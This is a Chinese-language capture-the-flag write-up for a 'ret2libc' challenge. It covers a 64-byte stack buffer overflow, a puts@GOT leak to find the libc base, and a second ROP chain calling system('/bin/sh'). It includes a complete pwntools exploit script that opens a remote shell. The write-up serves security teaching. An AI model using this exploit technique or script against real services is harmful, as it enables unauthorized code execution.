# ret2libc

## 题目简述

`vuln` 在 64 字节栈缓冲区中读取最多 `0x200` 字节，形成直接栈溢出；程序还主动提供了 `pop rdi; ret` gadget：

```c
void gadget(void) {
    asm volatile("pop %rdi; ret;");
}

void vuln(void) {
    char buf[64];
    puts("Input something: ");
    read(0, buf, 0x200);
}
```

覆盖返回地址的偏移为 72 字节。程序本身没有 `system` 或 `/bin/sh`，但可先泄露 GOT 中的 libc 地址，再根据题目提供的 `libc.so.6` 计算基址并执行 `system("/bin/sh")`。

## 解题过程

第一阶段调用 `puts(puts@GOT)`。GOT 表中保存的是 `puts` 在 libc 中的运行时地址，泄露后返回 `vuln`，获得第二次输入机会：

```text
padding → pop rdi → puts@GOT → puts@PLT → vuln
```

由 $libc\_base=puts_{leak}-puts_{offset}$ 得到 libc 基址，再定位 `system` 和字符串 `/bin/sh`。第二阶段在 `system` 前加入单独的 `ret`，用于满足 AMD64 System V ABI 的栈对齐要求：

```text
padding → ret → pop rdi → "/bin/sh" → system
```

完整脚本如下：

```python
from pwn import *

context.arch = "amd64"
elf = context.binary = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 10000)
io = remote(HOST, PORT)

offset = 72
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

payload1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.vuln,
)

io.sendafter(b"Input something: \n", payload1)
puts_leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = puts_leak - libc.sym.puts

log.info(f"puts leak = {puts_leak:#x}")
log.info(f"libc base = {libc.address:#x}")

bin_sh = next(libc.search(b"/bin/sh\x00"))
payload2 = flat(
    b"A" * offset,
    ret,
    pop_rdi,
    bin_sh,
    libc.sym.system,
)

io.sendafter(b"Input something: \n", payload2)
io.interactive()
```

运行时用 `HOST`、`PORT` 指定当前实例；若远程 libc 与附件不一致，计算出的 `system` 地址必然错误。

## 方法总结

标准 ret2libc 分为“泄露—回到漏洞点—二次利用”三步。第一条 ROP 链只负责得到一个可靠 libc 符号地址，第二条链再调用 `system`。除 72 字节溢出偏移外，gadget、PLT、GOT 和函数地址都应从当前 ELF/附件动态读取，不应保留比赛期间的临时主机和硬编码地址。
